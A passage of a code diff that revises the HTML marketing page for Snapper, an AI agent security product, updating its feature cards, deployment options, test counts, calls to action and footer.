-        <div class="number">4</div>
-        <div class="label">Alert channels (TG/Slack/webhook/email)</div>
+        <div class="number">55+</div>
+        <div class="label">AI domains proxied</div>
+      </div>
+      <div class="stat-card">
+        <div class="number">70+</div>
+        <div class="label">AI services monitored</div>
+      </div>
+      <div class="stat-card">
+        <div class="number">8</div>
+        <div class="label">Scanner detection categories</div>
+      </div>
+      <div class="stat-card">
+        <div class="number">6</div>
+        <div class="label">Enforcement layers</div>
       </div>
     </div>
   </div>
@@ -1315,39 +1831,67 @@ client = wrap(OpenAI())
 <section class="enterprise" id="enterprise">
   <div class="container">
     <h2>Enterprise-ready from day one</h2>
-    <p class="subtitle">Deploy on-prem or in your cloud. Full control over your data, your agents, and your compliance posture.</p>
+    <p class="subtitle">Deploy on-prem, in your cloud, or air-gapped. Full control over your data, your agents, and your compliance posture.</p>
     <div class="enterprise-grid">
       <div class="enterprise-card">
-        <h3>SSO & Identity</h3>
-        <p>SAML 2.0 and OIDC single sign-on. SCIM provisioning for automated user lifecycle. Role-based access control with admin, member, and viewer roles.</p>
+        <h3>Auth &amp; Identity</h3>
+        <p>PKCE-secured OIDC with JWKS validation. SAML 2.0 SSO with automatic IdP discovery. IdP group mapping for role assignment. SCIM provisioning for automated user lifecycle. MFA enforcement. GitHub and Google social login for developer onboarding.</p>
+        <span class="mono-detail">PKCE &middot; JWKS &middot; SAML &middot; SCIM &middot; IdP group mapping &middot; MFA</span>
       </div>
       <div class="enterprise-card">
-        <h3>Multi-Org Isolation</h3>
-        <p>Organization-scoped agents, rules, PII vaults, and audit trails. Full tenant isolation with per-org billing and quota enforcement.</p>
+        <h3>Audit &amp; Compliance</h3>
+        <p>SHA-256 hash chain for tamper-evident audit logs with 6-month retention. GDPR-compliant data handling with right-to-erasure support. CEF, JSON, and CSV export formats. Complete audit trail of every agent action, approval decision, and rule change.</p>
+        <span class="mono-detail">SHA-256 hash chain &middot; 6-mo retention &middot; GDPR &middot; CEF/JSON/CSV export</span>
       </div>
       <div class="enterprise-card">
-        <h3>On-Prem Deployment</h3>
-        <p>Docker Compose deployment with PostgreSQL, Redis, and Celery. Runs in your VPC. No data leaves your infrastructure. Air-gapped operation supported.</p>
+        <h3>Security Controls</h3>
+        <p>HSTS with preload. mTLS for service-to-service communication. HMAC-SHA256 rule signing prevents unauthorized policy changes. IP CIDR allowlisting. Configurable session limits and token rotation. Rate limiting with adaptive trust scoring.</p>
+        <span class="mono-detail">HSTS &middot; mTLS &middot; HMAC-SHA256 signing &middot; IP CIDR &middot; session limits</span>
       </div>
       <div class="enterprise-card">
-        <h3>SIEM Integration</h3>
-        <p>CEF-formatted syslog events for every security decision. Native integration with Splunk, Microsoft Sentinel, IBM QRadar, and any CEF-compatible collector.</p>
+        <h3>Ops &amp; Observability</h3>
+        <p>OpenTelemetry traces for distributed agent observability. Structured logging via structlog. Automated backups with pg_dump + GPG encryption + S3/K8s storage. Shadow mode for non-blocking policy evaluation. CrowdStrike LogScale integration.</p>
+        <span class="mono-detail">OpenTelemetry &middot; structlog &middot; GPG backups &middot; shadow mode &middot; CrowdStrike</span>
       </div>
       <div class="enterprise-card">
-        <h3>Compliance & Audit</h3>
-        <p>Complete audit trail of every agent action, approval decision, and rule change. Structured JSON logs. SOC 2 and GDPR-friendly architecture with data residency control.</p>
+        <h3>EU AI Act Compliance</h3>
+        <p>7 articles of the EU AI Act automated with evidence export. Risk classification mapping, transparency obligation tracking, human oversight enforcement, and technical documentation generation. Audit-ready compliance reports for regulators. 148 days to enforcement.</p>
+        <span class="mono-detail">7 articles &middot; Evidence export &middot; Risk classification &middot; 148 days</span>
       </div>
       <div class="enterprise-card">
-        <h3>Multi-Channel Alerting</h3>
-        <p>Route alerts and approval requests through Telegram bots, Slack bots (Socket Mode with slash commands), webhook delivery to your endpoints, and Celery-based email notifications. Per-org routing rules send alerts to the right channel for the right team.</p>
+        <h3>AI FinOps</h3>
+        <p>Cost attribution per agent, team, and project with 4-tier hierarchy. Z-score anomaly detection for spending spikes. Chargeback reports in FOCUS v1.3 format. Budget alerts and automated throttling. Full AI cost visibility across every provider and model.</p>
+        <span class="mono-detail">4-tier attribution &middot; Z-score anomaly &middot; FOCUS v1.3 &middot; budget alerts</span>
       </div>
       <div class="enterprise-card">
         <h3>Platform Admin Console</h3>
-        <p>Meta admin dashboard for customer provisioning, org management, impersonation for support, feature flags, and cross-org audit. Provision a new customer with one API call — they get an invite email and a guided setup wizard.</p>
+        <p>Meta admin dashboard for customer provisioning, org management, impersonation for support, feature flags, and cross-org audit. Provision a new customer with one API call &mdash; they get an invite email and a guided setup wizard.</p>
       </div>
       <div class="enterprise-card">
-        <h3>Dedicated Support</h3>
-        <p>Enterprise customers get priority support, custom integration assistance, deployment guidance, and a dedicated technical account manager.</p>
+        <h3>Multi-Channel Alerting</h3>
+        <p>Route alerts and approval requests through Telegram bots, Slack bots (Socket Mode with slash commands), webhook delivery to your endpoints, and email notifications. Per-org routing rules send alerts to the right channel for the right team.</p>
+      </div>
+    </div>
+    <div class="deploy-strip">
+      <div class="deploy-card">
+        <div class="deploy-icon">&#x2601;</div>
+        <h4>SaaS</h4>
+        <p>Managed cloud. Fastest time to value.</p>
+      </div>
+      <div class="deploy-card">
+        <div class="deploy-icon">&#x1F512;</div>
+        <h4>Private Cloud</h4>
+        <p>Your VPC. Your keys. Our management.</p>
+      </div>
+      <div class="deploy-card">
+        <div class="deploy-icon">&#x1F3E2;</div>
+        <h4>Self-Hosted</h4>
+        <p>Docker Compose on your infrastructure.</p>
+      </div>
+      <div class="deploy-card">
+        <div class="deploy-icon">&#x1F6E1;</div>
+        <h4>Air-Gapped</h4>
+        <p>Offline SDK. Zero external calls.</p>
       </div>
     </div>
   </div>
@@ -1357,21 +1901,21 @@ client = wrap(OpenAI())
 <section class="security-trust" id="security-trust">
   <div class="container">
     <h2>Security &amp; trust</h2>
-    <p class="security-intro">Snapper is a security product — so we hold ourselves to the same standard we enforce on agents.</p>
+    <p class="security-intro">Snapper is a security product &mdash; so we hold ourselves to the same standard we enforce on agents.</p>
     <div class="trust-grid">
       <div class="trust-card">
         <div class="trust-icon">
           <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
         </div>
         <h3>Fail-Closed by Default</h3>
-        <p>Every evaluation path defaults to deny. No rules configured? Deny. Rule engine error? Deny. Network timeout? Deny. This is non-negotiable — your agents never operate without policy enforcement.</p>
+        <p>Every evaluation path defaults to deny. No rules configured? Deny. Rule engine error? Deny. Network timeout? Deny. Canary probes verify agent liveness every 5 minutes &mdash; missing heartbeats trigger escalating alerts. This is non-negotiable.</p>
       </div>
       <div class="trust-card">
         <div class="trust-icon">
           <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
         </div>
-        <h3>Encryption at Rest</h3>
-        <p>PII vault uses AES-256-GCM with HKDF-derived keys. Vault tokens are 128-bit random with domain locking and 30-second TTL. Zero plaintext PII is stored anywhere in the system.</p>
+        <h3>Encryption &amp; Verification</h3>
+        <p>PII vault uses AES-256-GCM with HKDF-derived keys. Vault tokens are 128-bit random with domain locking and 30-second TTL. Evaluation receipts provide cryptographic proof that every policy check occurred &mdash; single-use verification tokens with 60-second expiry.</p>
       </div>
       <div class="trust-card">
         <div class="trust-icon">
@@ -1384,8 +1928,8 @@ client = wrap(OpenAI())
         <div class="trust-icon">
           <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
         </div>
-        <h3>2,000+ Automated Tests</h3>
-        <p>1,300+ unit tests, 168 Playwright E2E tests, 85 multi-tenant isolation tests, 90 integration tests, 95 live API tests, 35 meta admin tests, and a 13-scenario threat simulator that validates all signal types and kill chains. Every commit is tested.</p>
+        <h3>3,100+ Automated Tests</h3>
+        <p>1,734 unit tests, 228 Playwright E2E tests, 85 multi-tenant isolation tests, 109 integration tests, 95 live API tests, 147 auth/security tests, 35 meta admin tests, a 13-scenario threat simulator, and a 16-scenario integration simulator. Every commit is tested.</p>
       </div>
     </div>
   </div>
@@ -1395,8 +1939,25 @@ client = wrap(OpenAI())
 <section class="cta">
   <div class="container">
     <h2>Protect your AI agents today</h2>
-    <p>Deploy Snapper in your infrastructure and get enterprise-grade agent security with full threat detection, PII protection, and bot-in-the-loop approvals via Telegram and Slack.</p>
-    <br>
+    <p>Deploy Snapper in your infrastructure and get enterprise-grade agent security with runtime enforcement, EU AI Act compliance, AI FinOps, and full behavioral intelligence.</p>
+    <div class="cta-options">
+      <div class="cta-option">
+        <h4>Technical Deep-Dive</h4>
+        <p>90-minute architecture walkthrough with your security and engineering teams.</p>
+      </div>
+      <div class="cta-option">
+        <h4>Security Assessment</h4>
+        <p>Evaluate your current AI agent exposure and get a remediation roadmap.</p>
+      </div>
+      <div class="cta-option">
+        <h4>EU AI Act Gap Analysis</h4>
+        <p>Map your AI deployments against EU AI Act requirements with evidence gaps identified.</p>
+      </div>
+      <div class="cta-option">
+        <h4>5-Week Pilot</h4>
+        <p>Full deployment with your agents. Proof of value before commitment.</p>
+      </div>
+    </div>
     <div class="hero-actions" style="justify-content: center; opacity: 1;">
       <a href="mailto:john@mckinleylabs.com?subject=Snapper%20Demo%20Request&amp;body=Hi%20John%2C%0A%0AI%27m%20interested%20in%20a%20demo%20of%20Snapper%20for%20our%20team.%0A%0ACompany%3A%20%0AUse%20case%3A%20%0ANumber%20of%20agents%3A%20%0A%0AThanks!" class="btn-primary">
         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
@@ -1415,7 +1976,7 @@ client = wrap(OpenAI())
 <!-- FOOTER -->
 <footer>
   <div class="container">
-    <p style="margin-bottom: 6px;">&copy; 2026 McKinley Labs LLC &mdash; Snapper Agent Application Firewall</p>
+    <p style="margin-bottom: 6px;">&copy; 2026 McKinley Labs LLC &mdash; Snapper AI Agent Security Platform</p>
     <p style="margin-bottom: 6px;"><a href="mailto:john@mckinleylabs.com?subject=Snapper%20Demo%20Request&amp;body=Hi%20John%2C%0A%0AI%27m%20interested%20in%20a%20demo%20of%20Snapper%20for%20our%20team.%0A%0ACompany%3A%20%0AUse%20case%3A%20%0ANumber%20of%20agents%3A%20%0A%0AThanks!">Contact Sales</a> &middot; <a href="mailto:security@mckinleylabs.com">Security</a> &middot; <a href="https://app.snapperprotect.com">Dashboard</a> &middot; <a href="terms.html">Terms</a></p>
     <p>All rights reserved.</p>
   </div>
